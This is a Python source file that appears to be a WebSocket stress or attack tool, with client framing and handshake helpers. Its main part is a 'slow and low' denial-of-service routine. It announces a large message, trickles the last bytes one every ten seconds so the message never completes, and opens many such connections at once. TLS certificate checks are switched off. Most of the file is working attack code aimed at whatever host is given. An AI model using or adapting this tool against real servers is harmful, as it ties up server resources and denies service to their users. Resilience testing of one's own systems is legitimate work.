#!/usr/bin/env python3

import os
import random
import asyncio
import ssl

from .websocket_protocol import (
    WebSocketClientHandshake, WebSocketFrameHeader, websocket_mask,
    pack_2bytes, pack_8bytes, unpack_2bytes, unpack_8bytes)


async def _connect(host, port, use_tls):
    if use_tls:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
    else:
        context = None

    try:
        future = asyncio.open_connection(host, port, ssl=context)
        reader, writer = await asyncio.wait_for(future, timeout=10)
        print('success connect to', host, port)
        return reader, writer

    # except (asyncio.TimeoutError, ConnectionRefusedError) as e:
    except Exception as e:
        print('failed connect to', host, port, str(e))
        return None, None


async def _send_message(writer, data, opcode):
    msg_len = len(data)

    frame = WebSocketFrameHeader(opcode=opcode, length=msg_len)

    header = frame.tobytes()

    if msg_len < WebSocketFrameHeader.LENGTH_BOUNDARY_1:
        header += b''
    elif msg_len < WebSocketFrameHeader.LENGTH_BOUNDARY_2:
        header += pack_2bytes(msg_len)
    else:
        header += pack_8bytes(msg_len)

    masking_key = os.urandom(4)

    data = websocket_mask(masking_key, data)

    writer.write(header+masking_key+data)


async def _receive_message(reader):
    header = await reader.readexactly(2)
    frame = WebSocketFrameHeader()
    frame.frombytes(header)

    if frame.mask:
        raise Exception('should not mask on server side')

    if frame.length == WebSocketFrameHeader.LENGTH_MARK_1:
        msg_len = unpack_2bytes(await reader.readexactly(2))
    elif frame.length == WebSocketFrameHeader.LENGTH_MARK_2:
        msg_len = unpack_8bytes(await reader.readexactly(8))
    else:
        msg_len = frame.length

    data = await reader.readexactly(msg_len)
    print('received opcode', frame.opcode)
    print('received length', msg_len)
    if msg_len < 100:
        print('received data', data)

    if frame.opcode == WebSocketFrameHeader.OPCODE_CLOSE and msg_len == 2:
        print('received close reason', unpack_2bytes(data))


async def _close_websocket(writer):
    data = pack_2bytes(WebSocketFrameHeader.CLOSE_OK)
    await _send_message(writer, data, WebSocketFrameHeader.OPCODE_CLOSE)


async def _handshake(reader, writer, host, port, path):
    ws = WebSocketClientHandshake(host, port, path)

    request_str = ws.send_handshake_request()
    writer.write(request_str)

    data = await reader.read(10240)
    ws.receive_handshake_response(data)


async def _slow_and_low(writer, total_length, message_type):
    """
    Send a big chunk first, then send small data at slow speed.
    """

    if total_length < 10000:
        raise Exception('Can not attack with less than 10K size of data.')

    msg_len = total_length

    if message_type == 'text':
        opcode = WebSocketFrameHeader.OPCODE_TEXT
    else:
        opcode = WebSocketFrameHeader.OPCODE_BINARY

    frame = WebSocketFrameHeader(opcode=opcode, length=msg_len)
    header = frame.tobytes()

    if msg_len < WebSocketFrameHeader.LENGTH_BOUNDARY_1:
        header += b''
    elif msg_len < WebSocketFrameHeader.LENGTH_BOUNDARY_2:
        header += pack_2bytes(msg_len)
    else:
        header += pack_8bytes(msg_len)

    writer.write(header)

    print('Start slow and low attack...')

    # did not found a way to detect whether the connection is closed or not...
    size_sent = 0
    for _i in range(msg_len):
        pkt_len = random.randint(1000, 1400)
        data = os.urandom(pkt_len)
        writer.write(data)
        await writer.drain()

        size_sent += pkt_len
        if size_sent > total_length - 10000:
            break

    print('sent data size', size_sent)

    # don't send the last 10 bytes, so the message will never be delivered
    slow_round = msg_len - size_sent - 10
    print('send 1 byte every 10s to keep alive for {} round'.format(slow_round))

    for _i in range(slow_round):
        data = os.urandom(1)
        writer.write(data)
        await asyncio.sleep(10)


async def _read_and_discard(reader):
    _data = await reader.read(1024)
    while _data:
        _data = await reader.read(1024)
        # print(_data)


async def _attack(host, port, path, length, message_type, use_tls):
    reader, writer = await _connect(host, port, use_tls)
    await _handshake(reader, writer, host, port, path)

    asyncio.ensure_future(_read_and_discard(reader))
    await _slow_and_low(writer, length, message_type)


async def _test(host, port, path, length, message_type, use_tls):
    reader, writer = await _connect(host, port, use_tls)
    await _handshake(reader, writer, host, port, path)

    if message_type == 'text':
        opcode = WebSocketFrameHeader.OPCODE_TEXT
        data = os.urandom(length//2+1).hex()[:length].encode('ascii')
    else:
        opcode = WebSocketFrameHeader.OPCODE_BINARY
        data = os.urandom(length)

    print('sent length', len(data))
    if length < 100:
        print('sent data', data)

    await _send_message(writer, data, opcode)
    await _receive_message(reader)
    await _close_websocket(writer)


def attack(host, port, path, length, number, message_type='text', use_tls=False):
    """
    Send flood messages with specified length.
    """

    loop = asyncio.get_event_loop()

    for _i in range(number):
        attack_task = _attack(host, port, path, length, message_type, use_tls)
        asyncio.ensure_future(attack_task)

    loop.run_forever()
